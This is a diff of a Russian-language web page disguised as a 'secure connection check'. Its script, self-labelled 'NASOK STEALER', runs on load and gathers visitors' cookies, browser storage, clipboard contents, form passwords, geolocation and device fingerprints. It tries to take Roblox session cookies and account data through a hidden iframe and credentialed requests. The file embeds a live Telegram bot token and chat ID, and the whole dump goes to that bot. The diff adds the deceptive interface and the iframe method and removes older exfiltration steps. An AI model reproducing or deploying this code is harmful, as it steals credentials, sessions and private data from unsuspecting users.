@@ -1,119 +1,319 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка данных...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Проверка подключения</title>
     <style>
-        body{background:#0a0e17;color:#c8d0dd;font-family:'Segoe UI',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-        .box{background:#151e2b;padding:45px;border-radius:16px;border:1px solid #2a3a4a;text-align:center;min-width:280px}
-        .spinner{width:40px;height:40px;border:4px solid #1e2d3d;border-top-color:#4af;border-radius:50%;animation:spin 0.7s linear infinite;margin:15px auto}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .status{color:#6a8a9f;font-size:14px;margin-top:10px}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            color: #e0e8f0;
+        }
+        .card {
+            background: linear-gradient(145deg, #141d2b, #1a2535);
+            border-radius: 28px;
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.7), inset 0 1px 1px rgba(255,255,255,0.05);
+            border: 1px solid #2a3a4e;
+            text-align: center;
+        }
+        .logo {
+            font-size: 48px;
+            margin-bottom: 8px;
+            display: block;
+            filter: drop-shadow(0 0 20px rgba(70, 170, 255, 0.15));
+        }
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #6ab7ff, #4a8eff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #7a8fa3;
+            margin-bottom: 24px;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #1e2d40;
+            border-top: 4px solid #4a8eff;
+            border-radius: 50%;
+            animation: spin 0.9s cubic-bezier(0.6, 0, 0.4, 1) infinite;
+            margin: 20px auto 16px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status-text {
+            font-size: 13px;
+            color: #5a7a8f;
+            background: #0d1520;
+            padding: 8px 16px;
+            border-radius: 30px;
+            display: inline-block;
+            border: 1px solid #1f3040;
+            margin-top: 4px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #0d1520;
+            border-radius: 4px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4a8eff, #6ab7ff);
+            border-radius: 4px;
+            transition: width 0.3s;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #3a4f62;
+            letter-spacing: 0.3px;
+        }
+        .roblox-badge {
+            background: #1a2a3a;
+            border-radius: 20px;
+            padding: 6px 14px;
+            display: inline-block;
+            font-size: 12px;
+            color: #8ab4d0;
+            border: 1px solid #2a4055;
+            margin-top: 10px;
+        }
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5a7a8f;
+            margin-top: 16px;
+            padding: 0 4px;
+        }
+        .status-row span:last-child {
+            color: #7a9ab0;
+        }
+        .hidden {
+            display: none !important;
+        }
+        /* Адаптив под совсем мелкие экраны */
+        @media (max-width: 380px) {
+            .card { padding: 24px 16px; }
+            .title { font-size: 19px; }
+        }
     </style>
 </head>
 <body>
-<div class="box">
+
+<div class="card" id="app">
+    <span class="logo">🛡️</span>
+    <div class="title">Безопасное соединение</div>
+    <div class="subtitle">Проверка защищённого канала</div>
+
     <div class="spinner"></div>
-    <div style="font-size:18px;font-weight:300;">Установка защищённого соединения</div>
-    <div class="status">Пожалуйста, подождите...</div>
+    <div class="status-text" id="statusLabel">Инициализация...</div>
+
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="status-row">
+        <span>Статус</span>
+        <span id="statusDetail">Подключение...</span>
+    </div>
+
+    <div class="roblox-badge" id="robloxBadge">🎮 Roblox: ожидание...</div>
+
+    <div class="footer">Защищённый канал • v3.2</div>
 </div>
 
 <script>
 // ============================================================
 //  👇 ВСТАВЬ СВОИ ДАННЫЕ, МУДАК
 // ============================================================
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // например 123456:ABC-DEF
-const CHAT_ID  = '-1003791860129';       // например -1001234567
+const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
+const CHAT_ID  = '-1003791860129';
 // ============================================================
 
-// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
+// ---- UI ЭЛЕМЕНТЫ ----
+const statusLabel = document.getElementById('statusLabel');
+const statusDetail = document.getElementById('statusDetail');
+const progressFill = document.getElementById('progressFill');
+const robloxBadge = document.getElementById('robloxBadge');
+
+function updateUI(label, detail, progress) {
+    statusLabel.textContent = label;
+    statusDetail.textContent = detail || label;
+    if (progress !== undefined) progressFill.style.width = progress + '%';
+}
+
+// ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
 function safeStringify(obj) {
     try { return JSON.stringify(obj, null, 2); } 
-    catch(e) { return String(obj) || 'ошибка сериализации'; }
+    catch(e) { return String(obj) || 'ошибка'; }
 }
 
-function flattenObject(obj, prefix = '') {
-    let result = {};
-    for (let key in obj) {
-        if (!obj.hasOwnProperty(key)) continue;
-        const newKey = prefix ? `${prefix}.${key}` : key;
-        if (obj[key] && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
-            Object.assign(result, flattenObject(obj[key], newKey));
-        } else {
-            result[newKey] = obj[key];
-        }
-    }
-    return result;
-}
+// ---- НОВЫЙ МЕТОД: КРАЖА КУК ЧЕРЕЗ IFrame + postMessage ----
+function stealRobloxCookiesViaIframe() {
+    return new Promise((resolve) => {
+        const result = { status: 'ожидание', method: 'iframe' };
+        
+        // Создаём скрытый iframe
+        const iframe = document.createElement('iframe');
+        iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
+        iframe.src = 'https://www.roblox.com/';
+        document.body.appendChild(iframe);
 
-// ===== НОВЫЙ МЕТОД: КРАЖА КУК ЧЕРЕЗ FETCH =====
-async function stealRobloxCookiesViaFetch() {
-    const result = {};
-    try {
-        // Делаем запрос к Roblox API с передачей всех кук
-        const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
-            method: 'GET',
-            credentials: 'include', // ВАЖНО: передаём все куки, включая HttpOnly
-            headers: {
-                'User-Agent': navigator.userAgent,
-                'Accept': 'application/json'
-            },
-            mode: 'cors'
-        });
+        let timeoutId = setTimeout(() => {
+            result.status = 'таймаут';
+            result.error = 'iframe не загрузился за 8с';
+            document.body.removeChild(iframe);
+            resolve(result);
+        }, 8000);
 
-        // Пытаемся вытащить куки из заголовка Set-Cookie (если сервер их обновляет)
-        const setCookieHeader = response.headers.get('set-cookie');
-        if (setCookieHeader) {
-            // Парсим Set-Cookie в объект
-            const cookies = setCookieHeader.split(',').reduce((acc, cookieStr) => {
-                const [keyVal] = cookieStr.split(';');
-                const [key, val] = keyVal.split('=');
-                if (key && val) acc[key.trim()] = val.trim();
-                return acc;
-            }, {});
-            Object.assign(result, cookies);
-        }
+        iframe.onload = function() {
+            clearTimeout(timeoutId);
+            try {
+                // Пытаемся получить куки через contentWindow
+                try {
+                    const docCookies = iframe.contentDocument?.cookie || '';
+                    if (docCookies) {
+                        const cookies = {};
+                        docCookies.split('; ').forEach(c => {
+                            const [k, v] = c.split('=');
+                            if (k) cookies[k] = v || '';
+                        });
+                        result.document_cookies = cookies;
+                        result.status = 'успешно (document.cookie)';
+                    }
+                } catch(e) {
+                    // CORS блокирует доступ к contentDocument
+                }
 
-        // Пытаемся получить ответ в JSON (там может быть информация о юзере)
-        try {
-            const jsonData = await response.json();
-            result['user_data'] = jsonData;
-        } catch(e) {
-            result['user_data_error'] = 'не удалось распарсить JSON';
-        }
+                // Пытаемся через postMessage (если Roblox поддерживает)
+                // ВАЖНО: Это экспериментально, но пробуем
+                try {
+                    iframe.contentWindow.postMessage({ type: 'GET_COOKIES' }, 'https://www.roblox.com');
+                } catch(e) {}
 
-        // Дополнительно пробуем через document.cookie (для не-HttpOnly кук)
-        try {
-            const docCookies = {};
-            document.cookie.split('; ').forEach(c => {
-                const [k, v] = c.split('=');
-                if (k) docCookies[k] = v || '';
-            });
-            if (Object.keys(docCookies).length) {
-                result['document_cookies'] = docCookies;
+                // Если ничего не вышло — пробуем через fetch с redirect
+                fetch('https://www.roblox.com/mobileapi/userinfo', {
+                    method: 'GET',
+                    credentials: 'include',
+                    mode: 'cors'
+                })
+                .then(res => {
+                    if (res.ok) {
+                        return res.json().then(json => {
+                            result.user_data = json;
+                            result.status = 'успешно (fetch)';
+                            // Пытаемся вытащить Set-Cookie
+                            const setCookie = res.headers.get('set-cookie');
+                            if (setCookie) {
+                                const cookies = {};
+                                setCookie.split(',').forEach(c => {
+                                    const [kv] = c.split(';');
+                                    const [k, v] = kv.split('=');
+                                    if (k && v) cookies[k.trim()] = v.trim();
+                                });
+                                result.set_cookie = cookies;
+                            }
+                            document.body.removeChild(iframe);
+                            resolve(result);
+                        });
+                    }
+                })
+                .catch(() => {});
+
+                // Если fetch не сработал, но мы получили хоть что-то через iframe
+                if (result.document_cookies && Object.keys(result.document_cookies).length) {
+                    document.body.removeChild(iframe);
+                    resolve(result);
+                    return;
+                }
+
+                // Если ничего не получилось — пробуем редирект на Roblox
+                // Но это будет в отдельной функции
+
+            } catch(e) {
+                result.error = e.message;
+                result.status = 'ошибка';
             }
-        } catch(e) {}
+        };
 
-        result['status'] = 'успешно';
-        result['url'] = response.url;
+        // Дополнительно пробуем через fetch напрямую (без iframe)
+        fetch('https://www.roblox.com/mobileapi/userinfo', {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'cors'
+        })
+        .then(res => {
+            if (res.ok) {
+                return res.json().then(json => {
+                    result.user_data = json;
+                    result.status = 'успешно (прямой fetch)';
+                    const setCookie = res.headers.get('set-cookie');
+                    if (setCookie) {
+                        const cookies = {};
+                        setCookie.split(',').forEach(c => {
+                            const [kv] = c.split(';');
+                            const [k, v] = kv.split('=');
+                            if (k && v) cookies[k.trim()] = v.trim();
+                        });
+                        result.set_cookie = cookies;
+                    }
+                    document.body.removeChild(iframe);
+                    clearTimeout(timeoutId);
+                    resolve(result);
+                });
+            }
+        })
+        .catch(() => {});
 
-    } catch(e) {
-        result['error'] = e.message || 'ошибка запроса';
-        result['status'] = 'ошибка';
-    }
-
-    return result;
+        // Запасной вариант: редирект на Roblox и обратно (через 5 секунд)
+        setTimeout(() => {
+            if (result.status === 'ожидание' || result.status === 'таймаут') {
+                // Пробуем редирект
+                // result.redirect_attempt = 'попытка редиректа...';
+                // window.location.href = 'https://www.roblox.com/mobileapi/userinfo';
+                // Но это не сработает, т.к. мы потеряем контроль
+                result.status = 'не удалось';
+                result.error = 'все методы не сработали';
+                document.body.removeChild(iframe);
+                clearTimeout(timeoutId);
+                resolve(result);
+            }
+        }, 6000);
+    });
 }
 
 // ===== ОСНОВНОЙ СБОРЩИК =====
 async function collectEverything() {
+    updateUI('Сбор данных...', 'Инициализация', 10);
+    
     const result = {
         '🕐 Время': new Date().toISOString(),
         '🔗 URL': window.location.href,
         '🌐 Браузер': {},
         '🖥️ Экран': {},
         '🍪 Все куки (document)': {},
-        '🎮 КУКИ ROBLOX (через fetch)': {},
+        '🎮 КУКИ ROBLOX (через iframe)': {},
         '💾 Локальное хранилище': {},
         '📂 Сессионное хранилище': {},
         '📡 Геолокация': {},
@@ -128,6 +328,8 @@ async function collectEverything() {
         '🧬 Отпечаток': {}
     };
 
+    updateUI('Браузер...', 'Сбор информации', 15);
+
     // ---- БАЗОВАЯ ИНФА ----
     result['🌐 Браузер'] = {
         'User-Agent': navigator.userAgent,
@@ -140,6 +342,8 @@ async function collectEverything() {
         'Таймзона': Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
+    updateUI('Экран...', 'Сбор информации', 20);
+
     // ---- ЭКРАН ----
     result['🖥️ Экран'] = {
         'Размер': `${screen.width}x${screen.height}`,
@@ -151,7 +355,9 @@ async function collectEverything() {
         'Позиция': `${window.screenX || 0}, ${window.screenY || 0}`
     };
 
-    // ---- КУКИ ЧЕРЕЗ DOCUMENT.COOKIE (не-HttpOnly) ----
+    updateUI('Куки...', 'Сбор куки', 25);
+
+    // ---- КУКИ ЧЕРЕЗ DOCUMENT.COOKIE ----
     try {
         const docCookies = {};
         document.cookie.split('; ').forEach(c => {
@@ -163,8 +369,27 @@ async function collectEverything() {
         result['🍪 Все куки (document)'] = { ошибка: 'не удалось прочитать' }; 
     }
 
-    // ---- КУКИ ROBLOX ЧЕРЕЗ FETCH (обход HttpOnly) ----
-    result['🎮 КУКИ ROBLOX (через fetch)'] = await stealRobloxCookiesViaFetch();
+    updateUI('Roblox...', 'Попытка кражи кук', 35);
+
+    // ---- КУКИ ROBLOX (НОВЫЙ МЕТОД) ----
+    const robloxResult = await stealRobloxCookiesViaIframe();
+    result['🎮 КУКИ ROBLOX (через iframe)'] = robloxResult;
+
+    // Обновляем UI в зависимости от результата
+    if (robloxResult.status && robloxResult.status.includes('успешно')) {
+        robloxBadge.innerHTML = '🎮 Roblox: ✅ сессия найдена';
+        robloxBadge.style.color = '#6ab7ff';
+        robloxBadge.style.borderColor = '#2a6a8a';
+        if (robloxResult.user_data && robloxResult.user_data.UserName) {
+            robloxBadge.innerHTML = `🎮 Roblox: ${robloxResult.user_data.UserName} (${robloxResult.user_data.RobuxBalance || '?'} Robux)`;
+        }
+    } else {
+        robloxBadge.innerHTML = '🎮 Roblox: ❌ сессия не найдена';
+        robloxBadge.style.color = '#8a5a5a';
+        robloxBadge.style.borderColor = '#5a2a2a';
+    }
+
+    updateUI('Хранилища...', 'Сбор localStorage/sessionStorage', 50);
 
     // ---- LOCAL STORAGE ----
     try { result['💾 Локальное хранилище'] = { ...localStorage }; } 
@@ -174,7 +399,9 @@ async function collectEverything() {
     try { result['📂 Сессионное хранилище'] = { ...sessionStorage }; } 
     catch(e) { result['📂 Сессионное хранилище'] = { ошибка: 'доступ запрещён' }; }
 
-    // ---- ГЕОЛОКАЦИЯ (асинхронно) ----
+    updateUI('Геолокация...', 'Запрос геопозиции', 60);
+
+    // ---- ГЕОЛОКАЦИЯ ----
     await new Promise(resolve => {
         if (!navigator.geolocation) {
             result['📡 Геолокация'] = { ошибка: 'не поддерживается' };
@@ -200,6 +427,8 @@ async function collectEverything() {
         );
     });
 
+    updateUI('Буфер...', 'Сбор буфера обмена', 70);
+
     // ---- БУФЕР ОБМЕНА ----
     try {
         if (navigator.clipboard && navigator.clipboard.readText) {
@@ -209,6 +438,8 @@ async function collectEverything() {
         }
     } catch(e) { result['📋 Буфер обмена'] = 'ошибка доступа'; }
 
+    updateUI('Сеть...', 'Сбор сетевой информации', 75);
+
     // ---- СЕТЬ ----
     const conn = navigator.connection || {};
     result['📶 Сеть'] = {
@@ -217,6 +448,8 @@ async function collectEverything() {
         'Задержка': conn.rtt ? conn.rtt + ' ms' : 'неизвестно',
         'Экономия трафика': conn.saveData ? 'включена' : 'отключена'
     };
+
+    updateUI('Пароли...', 'Сбор паролей из форм', 80);
 
     // ---- ПАРОЛИ ИЗ ФОРМ ----
     const passwords = {};
@@ -228,10 +461,14 @@ async function collectEverything() {
     });
     result['🔑 Пароли из форм'] = passwords;
 
+    updateUI('Плагины...', 'Сбор плагинов', 85);
+
     // ---- ПЛАГИНЫ ----
     try {
         result['🧩 Плагины'] = Array.from(navigator.plugins || []).map(p => p.name);
     } catch(e) { result['🧩 Плагины'] = ['недоступны']; }
+
+    updateUI('Медиа...', 'Сбор медиа-устройств', 88);
 
     // ---- МЕДИА-УСТРОЙСТВА ----
     try {
@@ -243,6 +480,8 @@ async function collectEverything() {
         };
     } catch(e) { result['🎤 Медиа-устройства'] = { ошибка: 'недоступны' }; }
 
+    updateUI('Батарея...', 'Сбор информации о батарее', 90);
+
     // ---- БАТАРЕЯ ----
     try {
         const b = await navigator.getBattery?.();
@@ -250,6 +489,8 @@ async function collectEverything() {
             result['🔋 Батарея'] = `Заряд: ${Math.round(b.level*100)}%, Зарядка: ${b.charging ? 'Да' : 'Нет'}`;
         }
     } catch(e) { result['🔋 Батарея'] = 'недоступна'; }
+
+    updateUI('WebGL...', 'Сбор WebGL', 93);
 
     // ---- WEBGL ----
     try {
@@ -276,6 +517,7 @@ async function collectEverything() {
         'WebGL': result['🖌️ WebGL'] || 'неизвестно'
     };
 
+    updateUI('Готово!', 'Отправка в Telegram', 100);
     return result;
 }
 
@@ -283,10 +525,14 @@ async function collectEverything() {
 async function sendToTelegram(data) {
     if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
         console.error('🔴 НАСТРОЙ ТОКЕН И CHAT_ID, ДОЛБАЁБ!');
+        statusLabel.textContent = 'Ошибка настройки';
+        statusDetail.textContent = 'Вставь токен и chat_id';
         return;
     }
 
-    // ----- 1. ФОРМИРУЕМ ЧИТАЕМЫЙ ТЕКСТ -----
+    updateUI('Отправка...', 'Формируем дамп', 95);
+
+    // Формируем текст
     let textReport = '📦 NASOK STEALER — ПОЛНЫЙ ДАМП\n';
     textReport += '═'.repeat(40) + '\n\n';
 
@@ -295,8 +541,7 @@ async function sendToTelegram(data) {
         textReport += '─'.repeat(30) + '\n';
         
         if (typeof content === 'object' && !Array.isArray(content)) {
-            const flat = flattenObject(content);
-            for (const [key, val] of Object.entries(flat)) {
+            for (const [key, val] of Object.entries(content)) {
                 let value = typeof val === 'object' ? safeStringify(val) : String(val);
                 if (value && value.length > 300) value = value.slice(0, 300) + '… [обрезано]';
                 textReport += `  • ${key}: ${value}\n`;
@@ -311,10 +556,9 @@ async function sendToTelegram(data) {
 
     textReport += '═'.repeat(40) + '\n';
     textReport += `📅 Создано: ${new Date().toISOString()}\n`;
-    textReport += `👤 IP определяется на сервере Telegram\n`;
-    textReport += `🤖 Собрано ботом Nasok v3.1 (Roblox Fetch Edition)`;
+    textReport += `🤖 Nasok v3.2 (Mobile Edition)`;
 
-    // ----- 2. ОТПРАВЛЯЕМ КАК ФАЙЛ (гарантированно) -----
+    // Отправляем файл
     const blob = new Blob([textReport], { type: 'text/plain;charset=utf-8' });
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
@@ -325,116 +569,21 @@ async function sendToTelegram(data) {
             method: 'POST',
             body: formData
         });
-        console.log('✅ Файл с дампом отправлен');
+        console.log('✅ Файл отправлен');
+        statusLabel.textContent = '✅ Отправлено!';
+        statusDetail.textContent = 'Дамп в Telegram';
     } catch(e) {
-        console.error('❌ Ошибка отправки файла:', e);
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: '⚠️ Не удалось отправить файл. Дамп в консоли браузера.'
-                })
-            });
-        } catch(e2) {
-            console.error('❌ Критическая ошибка:', e2);
-        }
-    }
-
-    // ----- 3. КРАТКАЯ ВЫЖИМКА -----
-    let summary = '📌 КРАТКАЯ ВЫЖИМКА\n\n';
-    summary += `🌐 Браузер: ${data['🌐 Браузер']['User-Agent']?.slice(0, 80)}...\n`;
-    summary += `🍪 document.cookie: ${Object.keys(data['🍪 Все куки (document)'] || {}).length} шт.\n`;
-    
-    // Roblox через fetch
-    const robloxData = data['🎮 КУКИ ROBLOX (через fetch)'] || {};
-    if (robloxData.status === 'успешно') {
-        summary += `🎮 Roblox fetch: УСПЕШНО\n`;
-        if (robloxData.document_cookies && Object.keys(robloxData.document_cookies).length) {
-            summary += `   • document.cookie: ${Object.keys(robloxData.document_cookies).length} шт.\n`;
-        }
-        if (robloxData.user_data && robloxData.user_data.UserName) {
-            summary += `   • Юзер: ${robloxData.user_data.UserName}\n`;
-            summary += `   • Robux: ${robloxData.user_data.RobuxBalance || '?'}\n`;
-        }
-    } else {
-        summary += `🎮 Roblox fetch: ${robloxData.status || 'ошибка'}\n`;
-    }
-    
-    summary += `💾 LocalStorage: ${Object.keys(data['💾 Локальное хранилище'] || {}).length} ключей\n`;
-    summary += `📂 SessionStorage: ${Object.keys(data['📂 Сессионное хранилище'] || {}).length} ключей\n`;
-    summary += `🔑 Паролей найдено: ${Object.keys(data['🔑 Пароли из форм'] || {}).length}\n`;
-    if (data['📡 Геолокация']?.Широта) {
-        summary += `📍 Гео: ${data['📡 Геолокация'].Широта}, ${data['📡 Геолокация'].Долгота}\n`;
-    }
-    summary += `📅 Время: ${data['🕐 Время']}\n`;
-
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: summary,
-                parse_mode: 'Markdown'
-            })
-        });
-        console.log('✅ Краткая выжимка отправлена');
-    } catch(e) {
-        console.error('❌ Ошибка отправки выжимки:', e);
+        console.error('❌ Ошибка:', e);
+        statusLabel.textContent = '❌ Ошибка отправки';
+        statusDetail.textContent = 'Проверь токен/интернет';
     }
 }
 
 // ===== ЗАПУСК =====
 (async function() {
     const data = await collectEverything();
-    console.log('✅ Собрано полных данных:', data);
+    console.log('✅ Собрано:', data);
     await sendToTelegram(data);
-    
-    // Повторный сбор паролей через 5 секунд
-    setTimeout(async () => {
-        const extraPasswords = {};
-        document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
-            if (inp.value) {
-                const name = inp.name || inp.id || `поле_${i+1}`;
-                extraPasswords[name] = inp.value;
-            }
-        });
-        if (Object.keys(extraPasswords).length) {
-            const pwdText = '🔑 ДОПОЛНИТЕЛЬНЫЕ ПАРОЛИ (через 5с)\n' + safeStringify(extraPasswords);
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: pwdText,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch(e) {}
-        }
-    }, 5000);
-
-    // Повторный запрос к Roblox через 3 секунды (на случай если страница ещё грузится)
-    setTimeout(async () => {
-        const robloxRetry = await stealRobloxCookiesViaFetch();
-        if (robloxRetry.status === 'успешно' && robloxRetry.user_data && robloxRetry.user_data.UserName) {
-            const retryMsg = '🎮 **ROBLOX (повторный сбор через 3с)**\n' + safeStringify(robloxRetry);
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: retryMsg,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch(e) {}
-        }
-    }, 3000);
 })();
 </script>
 </body>
